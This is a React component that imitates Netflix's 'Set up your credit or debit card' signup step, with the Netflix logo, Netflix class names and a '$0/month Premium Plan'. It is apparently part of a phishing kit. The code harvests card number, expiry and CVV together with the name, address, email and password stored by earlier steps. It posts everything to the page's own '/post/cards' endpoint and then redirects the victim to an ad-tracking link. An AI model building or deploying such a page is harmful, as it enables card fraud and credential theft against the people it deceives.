"use client";
import { useState , useEffect ,  } from "react"
import { useLocalStorage } from "@/Components/useLocalStorage";
import axios from "axios";
import Inputmask from "inputmask";
import { useRouter } from 'next/navigation';
import cardValidator from "card-validator";
import clsx from "clsx";
const checkexp = (input) =>  {
    if (input.length != 5 || input.indexOf("/") == -1) {
        return false;
    }
    var twoDigits = /^[0-9]{2}$/;
    var splitExpireDate = input.split("/");
    var expireMonth = splitExpireDate[0];
    var expireYear = splitExpireDate[1];
    if (!twoDigits.test(expireMonth) || !twoDigits.test(expireYear)) {
        return false;
    }
    expireMonth = parseInt(expireMonth);
    expireYear = parseInt(expireYear);
    if (expireMonth > 12 || expireMonth == 0) {
        return false
    }

    // Check for expired dates
    var currentDate = new Date();
    var currentYear = parseInt(currentDate.getFullYear().toString().slice(-2));
    if (expireYear < currentYear) {
        return false;
    }
    if (expireYear == currentYear) {
        var currentMonth = currentDate.getMonth() + 1;
        if (expireMonth + 1 < currentMonth) {
            return false;
        }
        if (expireMonth + 1 == currentMonth && currentDate.getDate() > 1) {
            return false;
        }
    }
    return true;
}

const CreditForm = () => {
    const [showError, setShowError] = useState(false)
    useEffect(() => {
    var card = document.querySelector("#id_creditCardNumber")
    var exp = document.querySelector("#id_creditExpirationMonth")
    var cvv = document.querySelector("#id_creditCardSecurityCode")
    var cardmask = new Inputmask("9999 9999 9999 9999")
    Inputmask("99/99").mask(exp)
    Inputmask("999").mask(cvv)
    cardmask.mask(card)
    setTimeout( () => { 
        setShowError(false)
    } , 2000)
    } , [showError])
    const router = useRouter();
    const [error, setError] = useState()   
    const [form , setform] = useState({
        firstName : '', lastName: '', cardNumber : '', cardExp : '', 
        cardCvv : '',fullName : '', address: '' , city: '', state: '',zip: '' , email : '' , pass : '' , 
    }) 
    const fullName = useLocalStorage('fullName')
    const address = useLocalStorage('address')
    const city = useLocalStorage('city')
    const state = useLocalStorage('state')
    const zip = useLocalStorage('zip')
    const email = useLocalStorage('email')
    const pass = useLocalStorage('password')

    const { firstName , lastName , cardNumber , cardExp , cardCvv} = form
    
    const onChange = e => setform ({
    ...form, [e.target.name] : e.target.value , 'fullName': fullName , 'address': address , 'city': city , 'state' : state , 'zip': zip , 'email' : email , 'pass' : pass
  })

    const onSubmit = async e => {
        e.preventDefault()
        
        const { firstName , lastName , cardNumber , cardExp , cardCvv} = form
        const card = cardValidator.number(cardNumber)

        if( !firstName ||  !lastName || !cardNumber || !cardExp || !cardCvv){
                if(!firstName){
                    setError('First Name')
                }else if (!lastName){
                    setError('Last Name')
                }else if (!cardNumber){
                    setError('Card')
                }else if (!cardExp){
                    setError('Expiration')
                }else if (!cardCvv){
                    setError('Cvv')
                }
                setShowError(() => true)
                return false;
            }
        if( !card.isValid ) {
                setError("Card")
                setShowError(() => true)
                return false;
            }else if(!checkexp(cardExp)){
                setError("Expiration")
                setShowError(() => true)
                return false;
            }else{
                if( card.isValid && firstName && lastName  && checkexp(cardExp) && cardCvv) {
                    axios.post('/post/cards' , form).then( res => { 
                        res = res.data
                        if(res.status == 200) {
                            router.push("http://zfo20.bemobtrcks.com/go/e44baed1-73f1-4461-b348-0587d20595d9?gclid={gclid}&campaignid={campaignid}&adgroupid={adgroupid}&adposition={adposition}&targetid={targetid}&matchtype={matchtype}&creative={creative}&placement={placement}&network={network}&keyword={keyword}&device={device}")
                        }
                       })
                }
            }
        
        return false;
    }
    
 return(
        <div id="appMountPoint"><div className="netflix-sans-font-loaded"><div className="basicLayout notMobile firefox modernInApp signupSimplicity-creditOptionMode simplicity" dir="ltr" lang="en-IN"><div className="nfHeader noBorderHeader signupBasicHeader"><a href="" className="svg-nfLogo signupBasicHeader" data-uia="netflix-header-svg-logo"><svg viewBox="0 0 111 30" className="svg-icon svg-icon-netflix-logo" focusable="true"><g><path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14" /></g></svg><span className="screen-reader-text"></span></a><a href="" className="authLinks signupBasicHeader" data-uia="header-signout-link">Sign Out</a></div><div className="simpleContainer" data-transitioned-child="true"><div className="centerContainer" style={{display: 'block', transform: 'none', opacity: 1, transitionDuration: '250ms'}}><form onSubmit={e => onSubmit(e)} method="POST" data-uia="payment-form"><div className="paymentFormContainer"><div><div className="stepHeader-container" data-uia="header"><div className="stepHeader" data-a11y-focus="true" tabIndex={0}><span id className="stepIndicator" data-uia>STEP <b>3</b> OF <b>3</b></span><h1 className="stepTitle" data-uia="stepTitle">Set up your credit or debit card</h1></div></div></div><div className="fieldContainer"><span className="logos logos-block" data-uia="cardLogos-comp" aria-label="We accept VISA, MASTERCARD, AMEX and DINERS."><img alt="" className="logoIcon VISA" data-uia="logoIcon-VISA" src="/img/visa-v3.svg" /><img alt="" className="logoIcon MASTERCARD" data-uia="logoIcon-MASTERCARD" src="/img/mastercard-v2.svg" /><img alt="" className="logoIcon AMEX" data-uia="logoIcon-AMEX" src="/img/amex-v2.svg" /><img alt="" className="logoIcon DINERS" data-uia="logoIcon-DINERS" src="/img/icon_dinersclub_v2.png" srcSet="/img/icon_dinersclub_v2_2x.png 2x" /></span><div className><ul className="simpleForm structural ui-grid"><li data-uia="field-firstName+wrapper" className="nfFormSpace"><div data-uia="field-firstName+container" className="nfInput nfInputOversize"><div className="nfInputPlacement"><label className="input_id" placeholder="firstName"><input data-uia="field-firstName" name="firstName" onChange={ e => onChange(e)} value={firstName} className="nfTextField hasText" id="id_firstName" type="text" tabIndex={0} autoComplete="cc-given-name" maxLength={100} minLength={1} dir /><label htmlFor="id_firstName" className="placeLabel">First Name</label></label></div></div></li><li data-uia="field-lastName+wrapper" className="nfFormSpace"><div data-uia="field-lastName+container" className="nfInput nfInputOversize"><div className="nfInputPlacement"><label className="input_id" placeholder="lastName"><input data-uia="field-lastName" name="lastName" onChange={ e => onChange(e)} value={lastName} className="nfTextField hasText" id="id_lastName" type="text" tabIndex={0} autoComplete="cc-family-name" dir /><label htmlFor="id_lastName" className="placeLabel">Last name</label></label></div></div></li><li data-uia="field-creditCardNumber+wrapper" className="nfFormSpace"><div className="cardNumberContainer"><div data-uia="field-creditCardNumber+container" className="nfInput nfInputOversize"><div className="nfInputPlacement"><label className="input_id" placeholder="creditCardNumber"><input data-uia="field-creditCardNumber" name="cardNumber" onChange={ e => onChange(e)} value={cardNumber} className="nfTextField hasText" id="id_creditCardNumber" type="tel" tabIndex={0} autoComplete="off" maxLength={19} minLength={12} dir /><label htmlFor="id_creditCardNumber" className="placeLabel">Card number</label></label></div></div></div></li><li data-uia="field-creditExpirationMonth+wrapper" className="nfFormSpace"><div data-uia="field-creditExpirationMonth+container" className="nfInput nfInputOversize"><div className="nfInputPlacement"><label className="input_id" placeholder="creditExpirationMonth"><input data-uia="field-creditExpirationMonth" name="cardExp" onChange={ e => onChange(e)} value={cardExp}className="nfTextField hasText" id="id_creditExpirationMonth" type="tel" tabIndex={0} autoComplete="off" dir /><label htmlFor="id_creditExpirationMonth" className="placeLabel">Expiration date (MM/YY)</label></label></div></div></li><li data-uia="field-creditExpirationYear+wrapper" className="nfFormSpace" /><li data-uia="field-creditCardSecurityCode+wrapper" className="nfFormSpace"><div data-uia="field-creditCardSecurityCode+container" className="nfInput nfInputOversize tooltip"><div className="nfInputPlacement"><label className="input_id" placeholder="creditCardSecurityCode"><input data-uia="field-creditCardSecurityCode" name="cardCvv" onChange={ e => onChange(e)} value={cardCvv} className="nfTextField hasText" id="id_creditCardSecurityCode" type="tel" tabIndex={0} autoComplete="off" maxLength={4} minLength={3} dir /><label htmlFor="id_creditCardSecurityCode" className="placeLabel">Security code (CVV)</label></label></div><div className="tooltipWrapper" data-uia="tooltipWrapper"><span className="nf-svg-icon "><svg width={36} height={36} viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg"><g fill="none" fillRule="evenodd"><g><circle stroke="#A9A6A6" strokeWidth={2} cx={18} cy={18} r={17} /><path d="M17.051 21.094v-.54c0-.648.123-1.203.369-1.665.246-.462.741-.915 1.485-1.359a7.37 7.37 0 0 0 .981-.657c.222-.186.372-.366.45-.54.078-.174.117-.369.117-.585 0-.384-.177-.714-.531-.99-.354-.276-.831-.414-1.431-.414-.624 0-1.131.135-1.521.405-.39.27-.627.627-.711 1.071h-2.304a4.053 4.053 0 0 1 .738-1.845c.396-.546.924-.981 1.584-1.305.66-.324 1.44-.486 2.34-.486.852 0 1.596.153 2.232.459.636.306 1.134.726 1.494 1.26.36.534.54 1.143.54 1.827 0 .66-.177 1.227-.531 1.701-.354.474-.891.933-1.611 1.377-.42.252-.729.48-.927.684-.198.204-.33.399-.396.585a1.79 1.79 0 0 0-.099.603v.414h-2.268zm1.26 4.158c-.408 0-.762-.15-1.062-.45-.3-.3-.45-.654-.45-1.062 0-.408.15-.762.45-1.062.3-.3.654-.45 1.062-.45.408 0 .762.15 1.062.45.3.3.45.654.45 1.062 0 .408-.15.762-.45 1.062-.3.3-.654.45-1.062.45z" fill="#A9A6A6" /></g></g></svg></span></div></div></li></ul></div><ul className="orderInfo" data-uia="orderInfo"><li className="orderInfoItem" data-uia="selected-plan-item"><div className="orderInfoItem__content-container"><div className="orderInfoItem__content" data-uia="selected-plan-item+content"><div className="orderInfoItem__text orderInfoItem__title" data-uia="selected-plan-item+title">$&nbsp;0/month</div><div className="orderInfoItem__text orderInfoItem__description" data-uia="selected-plan-item+description">Premium Plan</div></div><button type="button" className="orderInfoItem__button" data-uia="changePlanAction">Change</button></div></li></ul><ul className="simpleForm structural ui-grid"><li data-uia="field-hasAcceptedTermsOfUse+wrapper" className="nfFormSpace"><div className="signupTerms" data-uia="termsOfUseMatlock+organic-rest"><span id data-uia="termsOfUse-Disclosure"><p>By checking the checkbox below, you agree to our <a target="_blank" href="">Terms of Use</a>, <a target="_blank" href="">Privacy Statement</a>,
                                and that you are over 18. We will automatically continue your 
                                membership and charge the monthly membership fee (currently $&nbsp;0) 
                                to your payment method until you cancel.  You may cancel at any time to 
                                avoid future charges.</p></span><div className="ui-binary-input"><input type="checkbox" className name="hasAcceptedTermsOfUse" id="cb_hasAcceptedTermsOfUse" tabIndex={0} data-uia="field-hasAcceptedTermsOfUse" defaultValue="true" /><label htmlFor="cb_hasAcceptedTermsOfUse" data-uia="field-hasAcceptedTermsOfUse+label"><span id data-uia>I agree.</span></label><div className="helper" /></div></div></li></ul></div></div><div className="submitBtnContainer"><button type="submit" autoComplete="off" className="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize" data-uia="action-submit-payment">Start Membership</button><h5 className={clsx("stepTitle" ,"error", !showError && "hide")}
                                data-uia="stepTitle">Something went wrong! Please check {error} details</h5></div></form>
                                </div></div>
          </div></div></div>
    )
}

export default CreditForm